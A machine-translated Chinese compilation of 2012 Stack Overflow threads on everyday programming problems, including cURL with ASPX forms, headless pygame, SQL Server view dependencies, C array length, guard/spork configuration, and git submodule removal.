这里的表格：

```
/* Here the form, for dates I suggest to use a calendar */ 
/* like https://github.com/arshaw/fullcalendar */
- form_for @trip, url(:trip, :index), :'data-remote' => true do |f|
  == f.error_messages
  == f.text_field :title
  == f.text_area :description
  == f.text_field :departure_date
  == f.text_field :return_data
  == f.submit 'Send' 
```

这里是控制器：

```
provides :json # if all your actions in your controller respond to #json it is more dry

get :index do
  @trip = Trip.new(params[:trip])

  if @trip.save
    render :success => true, :attributes => @trip.to_json
  else
    render :success => false, :errors => @trip.errors.full_messages
  end
end 
```

# php - 使用 ASPX 页面处理 cURL 的一般方法 - 需要帮助

> ID：10220103
> 
> 赞同：0
> 
> 时间：2012-04-19T00:40:25.260
> 
> 标签：php, asp.net, internet-explorer, firefox, curl

这是一个有点笼统的概念，但是您将如何处理`cURLing`一个用`ASPX`.

我的意思是我已经为此奋斗了三天，但我没有得到我所期望的`cURL`。

也许这就是`VIEWSTATE,EVENTVALIDATION`问题？
我正在阅读表单的 VIEWSTATE 和 EVENTVALIDATION 并将它们写回以供下一个 POST。那里有什么魔法发生吗？

幕后有什么我可能会错过的事情吗？

我正在使用`F12 of Internet Explorer developer tools`，我不得不说它在显示网络流量方面似乎比（对不起，我希望它有）做得更好`FireBug`，而且我`POST`只是按照它们的顺序来跟踪所有调用和值。但是，我仍然只能做到这一点。

任何想法、建议、见解，无论多么实用，都将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:56:54.517

我用 PHP + cURL 编写了很多数据抓取工具，虽然处理 ASPX 页面可能会让人头疼，但那里并没​​有发生什么神奇的事情。您只需要获取所有隐藏字段的值，例如 __VIEWSTATE、__EVENTVALIDATION、__EVENTTARGET、__EVENTARGUMENT 等，然后将它们包含在您的 POST 请求中。如果你做了很多抓取，你可能会考虑编写你自己的 curl 包装类来实现一些提取这些值的方法。

至于 FireBug，试试 Firefox 的 LiveHttpHeaders 扩展。它不仅可以让您查看发布的内容，还可以重新发送带有修改值的 POST 请求。

# python - Pygame错误“视频系统未初始化”在只有终端的ubuntu服务器上

> ID：10220104
> 
> 赞同：2
> 
> 时间：2012-04-19T00:40:26.837
> 
> 标签：python, ubuntu, pygame

我在带有ubuntu服务器的PC（PC-104）上使用pygame，因此它只有终端，没有UI。

在我的笔记本电脑上，代码完美运行，在终端上运行代码“例如：python game.py”，但在 PC104 上它给出“视频系统未初始化”，我读到错误显示，因为它是一种使用事件的方式在没有 UI 的系统上？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-03T17:05:42.747

感谢您的回答 jsbueno。几周前我能够找到解决方案，但忘记回答这个问题。

除了 X11 之外，我无法使用任何其他库运行任何 pygame 脚本。但是我发现没有图形库也可以运行脚本。只需将 SDL_VIDEOLIBRARY 环境变量设置为“虚拟”。

这在 bash 上是可行的，但我更喜欢在 python 上这样做：

```
os.environ["SDL_VIDEODRIVER"] = "dummy" 
```

有了这个，我能够运行 pygame 脚本，检测操纵杆事件等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:37:41.957

如果您将其设置为使用帧缓冲区或 vgalib，则可以在没有 X11 的系统中运行 pygame 程序 - 文档甚至谈到使用 aalib（它将在终端上使用 ascii 艺术显示图形。）

这部分文档有它：

> Pygame 在初始化时会从几个内部显示后端之一中进行选择。显示模式将根据当前用户的平台和权限来选择。在初始化显示模块之前，可以设置环境变量 SDL_VIDEODRIVER 来控制使用哪个后端。此处列出了具有多种选择的系统。
> 
> Windows：windib、directx
> Unix：x11、dga、fbcon、directfb、ggi、vgl、svgalib、aalib

因此，您需要做的是在启动代码之前设置 SDL_VIDEODRIVER 环境变量。并且是舒尔正确的库。已安装。

欲了解更多信息： http: [//www.pygame.org/docs/ref/display.html](http://www.pygame.org/docs/ref/display.html)

# user-interface - 如何配置node-mysql？

> ID：10220107
> 
> 赞同：3
> 
> 时间：2012-04-19T00:41:29.213
> 
> 标签：user-interface, node.js, configuration, node-mysql

我发现很多教程解释了如何安装“node-mysql”（基本上是：“npm install mysql”，就是这样）和其他解释如何进行查询但中间没有任何内容的教程。

我的意思是：没有GUI，在使用之前如何配置node-mysql（Mysql登录，Mysql密码，第一个表，..）？

或者：如何安装 GUI 来访问 node-mysql 的版本（这将解决问题 1）？

我通过它的向导尝试了“Mysql Workbench”，但是当主机和端口都正常时，我得到“无法连接到数据库服务器”。我搜索了“MySQL Workbench”网站，但没有关于 node-mysql 的信息。

在将 mysql 与 node.js 结合使用时，Node-Mysql 似乎是首选，但令人惊讶的是，我的问题在任何地方都完全没有。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:35:42.880

您不需要自己配置node-mysql，您需要学习[如何将用户添加到mysql数据库](http://dev.mysql.com/doc/refman/5.1/en/adding-users.html)。

如果您已经有现有用户，node-mysql 客户端使用起来非常简单：

```
var client = mysql.createClient({
  user: 'someusername',
  password: 'somepassword',
}); 
```

# ios - UIPageViewController 在方向改变时抛出 SIGABRT

> ID：10220110
> 
> 赞同：2
> 
> 时间：2012-04-19T00:41:39.193
> 
> 标签：ios, xcode, sigabrt, uipageviewcontroller

我有以下代码来显示杂志类型的应用程序。当应用程序旋转时，它会运行此代码。我确保它仅在旋转到支持的方向时运行。当此函数返回时，应用程序将失败并显示 SIGABRT。没有其他迹象表明原因。

我知道这是这个功能，因为当我删除它时，程序不会失败。

```
- (UIPageViewControllerSpineLocation)pageViewController:(UIPageViewController *)pageViewController
                   spineLocationForInterfaceOrientation:(UIInterfaceOrientation)orientation
{
    //If portrait mode, change to single page view
    if(UIInterfaceOrientationIsPortrait(orientation)){
        UIViewController *currentViewController = [self.pageViewController.viewControllers objectAtIndex:0];
         NSArray *viewControllers = [NSArray arrayWithObject:currentViewController];
         [self.pageViewController setViewControllers:viewControllers direction:UIPageViewControllerNavigationDirectionForward animated:YES completion:NULL];

         self.pageViewController.doubleSided = NO;

        return UIPageViewControllerSpineLocationMin;
    //If landscape mode, change to double page view    
    }else{
        //Get current view 
        UIViewController *currentViewController = [self.pageViewController.viewControllers objectAtIndex:0];

        //Create an array to store, views
        NSArray *viewControllers = nil;

         NSUInteger currentIndex = self.currentPage;

        //Conditional to check if needs page before or after
         if(currentIndex == 1 || currentIndex %2 == 1){
             UIViewController *nextViewController = [self pageViewController:self.pageViewController viewControllerAfterViewController:currentViewController];
             viewControllers = [NSArray arrayWithObjects:currentViewController,nextViewController, nil];
         }else{
             UIViewController *previousViewController = [self pageViewController:self.pageViewController viewControllerBeforeViewController:currentViewController];
             viewControllers = [NSArray arrayWithObjects:previousViewController, currentViewController, nil];
         }

        [self.pageViewController setViewControllers:viewControllers direction:UIPageViewControllerNavigationDirectionForward animated:YES completion:NULL];
        return UIPageViewControllerSpineLocationMid;

    }
    //return UIPageViewControllerSpineLocationMid;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:24:06.427

唉，borrrden 可能是对的。您的 XIB 中可能缺少您的 IBOutlets 之一。确保您的所有 IB 都正确连接，如果问题仍然存在，请说出来。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:20:41.330

好吧，您没有提供控制台的输出，这很好。快速浏览一下代码，我猜你的一个控制器（下一个或上一个）是 nil，并且由于你不能将 nil 插入到 NSArray 中（除了作为最后一个对象），它会引发错误。

**编辑**好吧，我的猜测是错误的。错误消息是说你给它的 UIViewControllers 不支持页面控制器需要的方向。这是因为您在您的子 UIViewControllers 中调用了一个方法`shouldRotateToInterfaceOrientation:`，并且它们没有返回（在这种情况下）左景观。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T09:08:46.070

我遇到了同样的错误

```
Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'All provided view controllers ((
    "<ContentViewController: 0x6a7eac0>",
    "<ContentViewController: 0x6d89f10>"
)) must support the pending interface orientation (UIInterfaceOrientationLandscapeLeft)' 
```

将以下内容添加到我的 PageModel 类中，其中页面布局的设计对我有用：

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return YES;
} 
```

# performance - 添加过期标头以提高使用 .htaccess 的页面的性能

> ID：10220111
> 
> 赞同：1
> 
> 时间：2012-04-19T00:42:03.410
> 
> 标签：performance, .htaccess, mod-expires

我有一个很棒的 .htaccess 代码，它确实提高了我的页面速度。

我下面的这个我不太了解，但从看起来它就像是压缩或不太确定的东西

```
<FilesMatch ".(js|css|html|htm|php|xml)$">
SetOutputFilter DEFLATE
</FilesMatch> 
```

这个真的很棒，它将所有内容的 Expire 标头设置为 10 年，将 text/html 设置为一天

```
ExpiresActive On
ExpiresDefault "access plus 10 years"
ExpiresByType text/html "access plus 1 day" 
```

**所以这个是用来取消设置 ETag 的，这是 YSlow 的要求规则之一**

```
Header unset ETag
FileETag None 
```

现在来谈谈我有问题的问题。

我不能真正在我的 Wordpress 博客中使用 w3 Total 缓存，因为它给了我一些随机问题，比如只在我的主页上显示一篇随机的旧帖子，解决这个问题的方法是删除缓存，然后一天后它会再次发生。

所以我不能依赖那个插件，但是我添加的 3 个代码`.htaccess`非常好，但有一个例外，我真的不知道如何解决这个问题。

例如，我今天早上访问了我的网站[http://applesiam.com](http://applesiam.com)，白天我有 3 个新帖子。如果我不真的重新加载页面，我仍然会从早上看到那个页面。

所以这真的让我很困惑。

我应该改变什么来不缓存实际的主页，以便它会被更新，除了图像和其余部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:07:55.430

我不确定这是否可行，但我发现这将解决浏览器缓存动态更新文件的行为

```
# Force no caching for dynamic files
<filesMatch "\.(php|cgi|pl|htm)$">
ExpiresActive Off
Header set Cache-Control "private, no-cache, no-store, proxy-revalidate, no-transform"
Header set Pragma "no-cache"
</filesMatch> 
```

# ruby-on-rails - 如何告诉 rvm 在哪里安装 gem 包

> ID：10220112
> 
> 赞同：2
> 
> 时间：2012-04-19T00:42:04.853
> 
> 标签：ruby-on-rails, ruby, rvm

通常，当我尝试使用 rvm 创建 gemset 时，它会将所有 gem 放在 $HOME/.rvm

但是，当我运行时在一台机器上：

```
rvm use 1.8.7-p358@chris_gems --create 
```

该命令尝试写入目录 /usr/local/rvm/gems/ruby-1.8.7-p358

结果我得到了权限错误。

我尝试在网上搜索与安装路径相关的“rvm”的命令行参数，但在搜索 10 分钟后没有找到任何东西（也许我在谷歌上很烂）。我还尝试将 GEM_HOME、GEM_PATH 设置为我的主目录。但这并没有什么不同。

关于如何让 rvm 在 $HOME/.rvm 中安装东西的任何建议谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T14:18:09.153

有两种方法可以使它工作：

1.  将您的用户添加到`rvm`组 - 这将允许您的用户在系统中编写 gemsets

2.  运行`rvm user gemsets`- 这将创建所有新的 gemsets`$HOME/.rvm`

# javascript - 为什么我在 PhoneGap 中得到非常粗略的加速度计测量结果？

> ID：10220113
> 
> 赞同：1
> 
> 时间：2012-04-19T00:42:11.300
> 
> 标签：javascript, android, cordova

我正在PhoneGap中构建一个简单的加速度计应用程序，主要针对Android，根据我设置的频率，我得到的读数非常不一致。如果我将频率设置为 100，我每秒会进行 10 次测量。但是，如果我尝试 50 毫秒或 40 或 10 的频率，我会得到非常不一致的读数，即每秒 18 到 27 个读数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T14:43:06.673

我认为归结为 setInterval 不能保证在您提供的时间间隔内触发。由于 JavaScript 是单线程的，当达到间隔时间时，它可能正忙于做其他事情。这将解释您获得的可变读数。

# sql-server - 我可以在 SQL Server 中找到视图的外键关系吗？

> ID：10220123
> 
> 赞同：0
> 
> 时间：2012-04-19T00:43:48.980
> 
> 标签：sql-server, foreign-keys, foreign-key-relationship, database-metadata

我已经构建了一个使用表外键的工具，但我想扩展它以支持视图。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:13:50.047

在 SQL Server 2008 及更高版本中，假设您只对同一数据库中的依赖项感兴趣，您可以使用以下查询来确定每个视图中引用的所有表、视图和函数：

```
;WITH x AS
(
 SELECT
  v = QUOTENAME(OBJECT_SCHEMA_NAME(d.referencing_id))
     + '.' + QUOTENAME(OBJECT_NAME(d.referencing_id)),
  t = QUOTENAME(OBJECT_SCHEMA_NAME(d.referenced_id))
     + '.' + QUOTENAME(OBJECT_NAME(d.referenced_id)),
  td = o2.type_desc
 FROM sys.sql_expression_dependencies AS d
 INNER JOIN sys.objects AS o1
 ON d.referencing_id = o1.[object_id]
 INNER JOIN sys.objects AS o2
 ON d.referenced_id = o2.[object_id]
 WHERE o1.type_desc = 'VIEW'
)
SELECT [View] = v, Referenced_Object = t, [Type] = td
 FROM x
 GROUP BY v, t, td
 ORDER BY v, t; 
```

# c - 如何知道 int* 数组的结尾？

> ID：10220124
> 
> 赞同：9
> 
> 时间：2012-04-19T00:43:49.177
> 
> 标签：c, arrays, int

我正在使用`int*`数据类型制作一个动态数组`malloc()`。但问题是，如何知道数组的结尾？

没有对应`\0`的`int*`数据类型，那么，如何做到这一点？将大小作为函数的输出参数传递？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-19T00:47:14.147

C 不像其他一些语言那样管理数组长度。

您可能会为此考虑一个结构：

```
typedef struct t_thing {
  int* things;
  size_t count;
} t_thing; 
```

正在使用：

```
t_thing t = { (int*)malloc(sizeof(int) * n), n }; 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-19T00:45:29.627

没有“官方”等效`\0`于整数，但您当然可以使用自己的值。例如，如果您的整数表示距离，那么您可以使用 -1（不是有效距离）作为标记值来指示数组的结尾。

如果您的整数数组可以合理地包含*任何* `int`值，那么您可以将已分配数组的大小与附加参数传回您的函数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T00:47:05.433

您可以`NULL`用作最终值。您可以使用跟踪条目数的数组将整数添加到结构中。或者您可以单独跟踪尺寸。你可以随心所欲地做。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T02:35:00.577

C 不知道动态数组的末尾在哪里。您应该记住为数组分配的大小。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-19T05:41:52.820

当您使用 malloc 分配内存时，分配的字节数存储在“malloc”内存开始之前。如果你知道大小，你也知道结束！这在 K&R 书籍 C 的圣经中有解释。希望我也能给你页码，但是当你看到它时你就会知道。

# rspec - 即使我只想使用组为 rspec 启动它，为什么 guard 会同时为 rspec 和 cucumber 启动 spork？

> ID：10220129
> 
> 赞同：6
> 
> 时间：2012-04-19T00:44:29.390
> 
> 标签：rspec, cucumber, spork, guard

在我的 Gemfile...

```
group :development, :test do
  gem 'capybara', "1.1.2"
  gem 'database_cleaner', "0.7.0"

  gem 'cucumber', "1.1.2"
  gem 'cucumber-rails', "1.2.0"

  gem 'rspec-rails', "2.7.0"

  gem 'spork', "0.9.0.rc9"

  gem 'launchy' #launches the page

  gem 'guard-spork', "0.3.1"
  gem 'guard-rspec', "0.5.4"
  gem 'guard-cucumber', "0.7.4"

  gem 'factory_girl_rails'
end 
```

我的 Guardfile 有两个组（:specs 和 :features）。

```
group :specs do

  guard :spork, :rspec_env => { 'RAILS_ENV' => 'test' } do
    watch('config/application.rb')
    watch('config/environment.rb')
    watch(%r{^config/environments/.+\.rb$})
    watch(%r{^config/initializers/.+\.rb$})
    watch('spec/spec_helper.rb')
  end

  guard :rspec, :version => 2 do
    watch(%r{^spec/.+_spec\.rb$})
    watch(%r{^lib/(.+)\.rb$})     { |m| "spec/lib/#{m[1]}_spec.rb" }
    watch('spec/spec_helper.rb')  { "spec" }

  # # Rails example
    watch(%r{^spec/.+_spec\.rb$})
    watch(%r{^app/(.+)\.rb$})                           { |m| "spec/#{m[1]}_spec.rb" }
    watch(%r{^lib/(.+)\.rb$})                           { |m| "spec/lib/#{m[1]}_spec.rb" }
    watch(%r{^app/controllers/(.+)_(controller)\.rb$})  { |m| ["spec/routing/#{m[1]}_routing_spec.rb", "spec/#{m[2]}s/#{m[1]}_#{m[2]}_spec.rb", "spec/acceptance/#{m[1]}_spec.rb"] }
    watch(%r{^spec/support/(.+)\.rb$})                  { "spec" }
    watch('spec/spec_helper.rb')                        { "spec" }
    watch('config/routes.rb')                           { "spec/routing" }
    watch('app/controllers/application_controller.rb')  { "spec/controllers" }
    # Capybara request specs
    watch(%r{^app/views/(.+)/.*\.(erb|haml)$})          { |m| "spec/requests/#{m[1]}_spec.rb" }
  end

end

group :features do

  guard 'spork', :cucumber_env => { 'RAILS_ENV' => 'test' } do
    watch('config/application.rb')
    watch('config/environment.rb')
    watch(%r{^config/environments/.+\.rb$})
    watch(%r{^config/initializers/.+\.rb$})
    watch('spec/spec_helper.rb')
  end

  guard 'cucumber' do
    watch(%r{^features/.+\.feature$})
    watch(%r{^features/support/.+$})          { 'features' }
    watch(%r{^features/step_definitions/(.+)_steps\.rb$}) { |m| Dir[File.join("**/#{m[1]}.feature")][0] || 'features' }
  end

end 
```

当我尝试运行 :specs 组时，我希望警卫只为 Rspec 运行 Spork。

```
guard -g specs start 
```

但是，我可以从输出中看到，guard 为 Rspec 和 Cucumber 运行了 Spork。

```
~/current[master]% guard -g specs start
WARNING: You are using Guard outside of Bundler, this is dangerous and may not work. Using `bundle exec guard` is safer.
Guard could not detect any of the supported notification libraries.
Guard is now watching at '/Users/rupert/Desktop/cws-rails'
Starting Spork for RSpec & Cucumber 
Using RSpec
Using Cucumber
Preloading Rails environment
Preloading Rails environment
Loading Spork.prefork block...
Loading Spork.prefork block...
Spork is ready and listening on 8990!
Spork is ready and listening on 8989!
Spork server for RSpec & Cucumber successfully started
Guard::RSpec is running, with RSpec 2!
Running all specs 
```

是否有任何我可能错过的 SPORK 或警卫配置文件？

更新：

1.  去掉保护黄瓜

2.  删除或重命名功能文件夹

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T22:21:07.860

您必须在 RSpec 组的 Spork 中禁用 Cucumber，反之亦然：

```
specs :specs    
  guard :spork, :cucumber => false do
    # ...
  end
end

specs :features    
  guard 'spork', :rspec => false do
    # ...
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-22T20:54:11.057

我知道它已经过时了，但我现在也偶然发现了这个问题并想通了：

我的项目中有一个`features`子目录，其中包含一个文件： `features/step_definitions/email_steps.rb`

查找提交我意识到这是从 rails_apps_composer 添加的：测试框架。

所以：

删除子目录`features`可以防止`spork`尝试使用 cucumber。

# java - java中的计时器，降低速度

> ID：10220135
> 
> 赞同：1
> 
> 时间：2012-04-19T00:45:04.960
> 
> 标签：java, swing, timer, swingx

我正在制作的程序是俄罗斯方块。我坚持的一个部分是当玩家达到一定分数时降低计时器的速度。例如，每 200 个点（模将检查）将使时间减少 50。最初时间从 500 毫秒开始。我无法弄清楚如何减少它，因为一旦我创建了计时器，传入的时间就不会改变。

** 我的构造函数实例化了计时器。

```
public PlayingPanel(SidePanel p)
{
  pf = new PlayingField(p);
  generateNewPiece(); 
  setFocusable(true);
  addKeyListener(new KeyEvent());
  timer = new Timer(time, new BlockListener());
  timer.start();   
}

public void startTimer()
{
  time -= 20;
}

/**
 * generates new piece
 */
public void generateNewPiece()
{
  startTimer();
  ...
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:48:05.787

[Timer.setDelay(int ms)](http://docs.oracle.com/javase/7/docs/api/javax/swing/Timer.html#setDelay%28int%29)

> 设置 Timer 的事件间延迟，即连续动作事件之间的毫秒数。这不影响初始延迟属性，可以通过 setInitialDelay 方法设置。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:01:52.570

默认情况下，[`javax.swing.Timer`](http://docs.oracle.com/javase/6/docs/api/javax/swing/Timer.html)将*合并*事件；您可能会看到这种效果。您可以对动画进行自定时，如此处所示[，](https://stackoverflow.com/a/7546025/230513)以验证您在最高速度（最短周期）下没有超出可用动画预算。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:16:47.053

您可以创建一个类，例如处理所有基于时间的事件的 GameTimer。GameTimer 会将自己注册到 Timer，或使用您选择的任何时间测量方法。然后，您的其他对象可以将自己注册到 GameTimer（可能以他们想要的频率），GameTimer 会相应地通知他们。通过这种方式，您可以将自己从 Timer 中抽象出来，这通常是一个好主意，并且您可以更好地控制如何处理基于时间的事件。如果 GameTimer 注册到一个计时器并告诉它以 10 毫秒更新，那对于高达 100 fps 的精度应该足够了。然后你可以让 GameTimer 通知 BlockListener 任何你想要的度量。

这也意味着，如果您找到了一种更好的方法来测量时间，您将不必在多个地方更改代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T00:52:12.820

计时器对象永远不会让您更改时间变量。您可以取消当前计时器并创建一个新计时器，使用 -20 作为参数并使用新计时器更新您的事件。我的 Swing Java-fu 很弱，但在 1.6 中，您可能可以调用 setDelay 以使用新时间（以毫秒为单位）更新现有计时器。

# windows - Windows 内存管理器用来确定何时开始将页面交换到磁盘的阈值是多少？

> ID：10220136
> 
> 赞同：2
> 
> 时间：2012-04-19T00:45:05.683
> 
> 标签：windows, memory, virtual, threshold

我在 Perfmon 计数器“内存”-“工作集”描述中看到了这条评论：

> 如果计算机中的可用内存高于阈值，则页面将留在进程的工作集中，即使它们没有被使用。当可用内存低于阈值时，将从工作集中修剪页面。

我无法找到有关此阈值的任何文档。它是可用 RAM 的百分比？是在 Commit Charge 消耗所有可用 RAM 的时候吗？系统如何处理内核页面和用户模式页面？

所以我的问题是：

*   那个门槛是多少？
*   有没有办法检测它？
*   不同版本的窗口是否有不同的行为或阈值？

场景是我的进程将尝试使用与可用物理 RAM 一样多的内存。一旦达到该限制，我就可以在磁盘上取消分配和缓存某些内存块，以便为新内容腾出空间。它这样做是为了帮助缓解内存条件较低时的页面文件抖动。我想在内存管理器开始将页面交换到磁盘之前执行释放，因为内存使用量已经超过了魔法阈值。

我目前使用 MEMORYSTATUSEX::ullAvailPhys 值（由 GlobalMemoryStatusEx 填充）来识别可用物理内存的数量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-22T14:30:45.680

Windows 为程序和磁盘缓存使用尽可能多的 RAM，因此它在某些时候不会大量交换......

如果您想要更多 RAM 来运行应用程序，则必须减少磁盘缓存。

SysInternal 有一个设置磁盘​​缓存的工具。

```
cacheset.exe 
```

你可以在这里找到它：

[http://technet.microsoft.com/en-us/sysinternals/bb897561.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897561.aspx)

# objective-c - 数学方程式的语法不正确

> ID：10220137
> 
> 赞同：1
> 
> 时间：2012-04-19T00:45:10.927
> 
> 标签：objective-c, cocoa-touch, math, double, color-space

我正在尝试使用[此处](http://www.easyrgb.com/index.php?X=MATH&H=07#text7)提供的公式将 XYZ 值转换为 LAB* 。

问题是，当我通过公式时 - 三个变量 var_X、var_Y 和 var_Z 的输出始终为 1.00。

如果我将使用的值放入[wolfram alpha](http://www.wolframalpha.com/input/?i=pow%280.345393,%20%28%201/3%20%29%29;%20%20%20)中，我实际上会得到（大概）正确的输出（链接中的示例是这个问题底部的日志中显示的 var_Z 的输入）。

你能帮我找出我哪里出错了吗？

这是我的代码：

```
-(NSArray*)convertXYZtoLABSpaceWithLABArray:(NSArray*)labArray{
    double var_X = [[labArray objectAtIndex:0] doubleValue] /  95.047;
    double var_Y = [[labArray objectAtIndex:1] doubleValue] /  100.000;
    double var_Z = [[labArray objectAtIndex:2] doubleValue] /  108.883;

    NSLog(@"convertXYZtoLAB... var_X: %f var_Y: %f var_Z: %f", var_X, var_Y, var_Z);

    if ( var_X > 0.008856 ){
        var_X = pow(var_X, ( 1/3 ));   
    }else{                    
        var_X = ( 7.787 * var_X ) + ( 16 / 116 );
    }

    if ( var_Y > 0.008856 ){
        var_Y = pow(var_Y, ( 1/3 ));   
    }else{
        var_Y = ( 7.787 * var_Y ) + ( 16 / 116 );   
    }

    if ( var_Z > 0.008856 ){
        var_Z = pow(var_Z, ( 1/3 ));   
    }else{
        var_Z = ( 7.787 * var_Z ) + ( 16 / 116 );   
    }

    NSLog(@"convertXYZtoLAB... var_X: %f var_Y: %f var_Z: %f", var_X, var_Y, var_Z);

    NSNumber *l,*a,*b;

    l = [NSNumber numberWithDouble:( 116 * var_Y ) - 16];
    a = [NSNumber numberWithDouble:500 * ( var_X - var_Y )];
    b = [NSNumber numberWithDouble:200 * ( var_Y - var_Z )];

    return([NSArray arrayWithObjects:l,a,b, nil]);

} 
```

这是该方法中两个日志点的公式的输入/输出：

```
convertXYZtoLAB... var_X: 0.345393 var_Y: 0.502066 var_Z: 0.308145
convertXYZtoLAB... var_X: 1.000000 var_Y: 1.000000 var_Z: 1.000000 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:49:22.057

您可能得到整数除法而不是浮点除法。尝试`1.0/3`代替`1/3`等。 `1/3`在整数数学中四舍五入为零。

# git - git rm -r --cached 不删除子模块文件夹和内容

> ID：10220140
> 
> 赞同：7
> 
> 时间：2012-04-19T00:45:19.427
> 
> 标签：git, git-submodules

解决方案：`--cached`从`git rm -r --cached submodule/name`. [脚本](https://github.com/byrongibson/scripts/blob/master/git-rm-submodule.sh)供参考。

* * *

我正在尝试根据[这个 SO answer](https://stackoverflow.com/questions/1260748/how-do-i-remove-a-git-submodule)删除一个 git 子模块，但该子模块没有被删除。

我添加子模块，提交更改，然后使用`git rm -r --cached $path/to/submodule`（减去尾随 / ）删除它，提交更改，但子模块仍然存在。

我可以`rm -rf submodules/lift_sbt_24`用来删除文件夹和内容，但为什么不`git rm -r --cached`这样做呢？

（从 .gitmodules 中删除相关部分可以正常工作，没问题，因此此处未提及）

这是 Ubuntu 11.10 上的 git 1.7.5.4，fwiw。完整示例：

```
$> git submodule add git@github.com:lift-stack/lift_24_sbt.git submodules/lift_24_sbt
Adding submodule from repo git@github.com:lift-stack/lift_24_sbt.git as submodules/lift_24_sbt
Cloning into submodules/lift_24_sbt...
remote: Counting objects: 619, done.
remote: Compressing objects: 100% (375/375), done.
remote: Total 619 (delta 172), reused 593 (delta 147)
Receiving objects: 100% (619/619), 1.74 MiB | 112 KiB/s, done.
Resolving deltas: 100% (172/172), done.
$> git status
# On branch master
# Your branch is ahead of 'origin/master' by 1 commits.
#
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#   modified:   .gitmodules
#   new file:   submodules/lift_24_sbt
#
$> git add -a
$> git commit 'added submodules/lift_24_sbt'
[master 9894113] update
 2 files changed, 4 insertions(+), 0 deletions(-)
 create mode 160000 submodules/lift_24_sbt
$> git rm -r --cached submodules/lift_24_sbt
rm 'submodules/lift_24_sbt'
$> git status
# On branch master
# Your branch is ahead of 'origin/master' by 1 commits.
#
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#   deleted:    submodules/lift_24_sbt
#
# Untracked files:
#   (use "git add <file>..." to include in what will be committed)
#
#   submodules/lift_24_sbt/
$> git add -a
$> git commit -m 'deleted submodules/lift_24_sbt'
# On branch master
# Your branch is ahead of 'origin/master' by 1 commits.
#
nothing to commit (working directory clean)
$> ls -al submodules/lift_24_sbt/
total 1060
drwxr-xr-x 5 kurtosis kurtosis    4096 2012-04-18 17:26 ./
drwxrwxr-x 6 kurtosis kurtosis    4096 2012-04-18 17:26 ../
drwxrwxr-x 8 kurtosis kurtosis    4096 2012-04-18 17:32 .git/
drwxrwxr-x 2 kurtosis kurtosis    4096 2012-04-18 17:26 project/
drwxrwxr-x 3 kurtosis kurtosis    4096 2012-04-18 17:26 src/
-rw-rw-r-- 1 kurtosis kurtosis     931 2012-04-18 17:26 build.sbt
-rw-rw-r-- 1 kurtosis kurtosis     463 2012-04-18 17:26 .gitignore
-rw-rw-r-- 1 kurtosis kurtosis      91 2012-04-18 17:26 README.md
-rwxrwxr-x 1 kurtosis kurtosis     110 2012-04-18 17:26 sbt*
-rw-rw-r-- 1 kurtosis kurtosis     131 2012-04-18 17:26 sbt.bat
-rw-rw-r-- 1 kurtosis kurtosis 1041753 2012-04-18 17:26 sbt-launch.jar
$> git --version
git version 1.7.5.4 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-06T02:25:36.233

你看到的是正确的；`git rm --cached -r`实际上，不会*从*中删除文件，而`working tree`只是从`index`. 如果`git`要从`index` *和*中删除文件，则`working tree`不应使用`--cached`. 有关更多信息，请参见[`git-rm`手册页](http://linux.die.net/man/1/git-rm)。

* * *

以下是对您所做操作的说明。我假设您输入了您采取的步骤，而不是从终端复制；据我所知，`git add -a`不是[已知的 git-add 标志](http://linux.die.net/man/1/git-add)；我也相当肯定你的意思`git commit -m <message>`。

您已采取的缩减步骤：

```
 # First, add the submodule. 
$> git submodule add git@github.com:lift-stack/lift_24_sbt.git submodules/lift_24_sbt
# Check that the submodule exists. (It does). 
$> git status
# Add everything to the staging area from the working tree. 
$> git add -a
# Commit all changes. 
$> git commit 'added submodules/lift_24_sbt' 
```

至此，您已经成功添加了模块，并且一切都按预期工作。
您接下来尝试做的是*删除*模块：

```
$> git rm -r --cached submodules/lift_24_sbt 
```

**注意**：在这里，我们**不会**从 中删除文件`working index`，*只*从 中删除文件`index`，因为`--cached`：

> ```
> --cached
>        Use this option to unstage and remove paths only from the index. Working tree
>        files, whether modified or not, will be left alone. 
> ```

然后，检查我们是否删除了子模块：

```
$> git status
... <snip> 
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#   deleted:    submodules/lift_24_sbt 
```

如您所见，子模块已被删除，一切正常。但是请注意，这些文件仍然存在于*工作树*中- 您仍然可以使用`ls`. :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-23T06:09:29.830

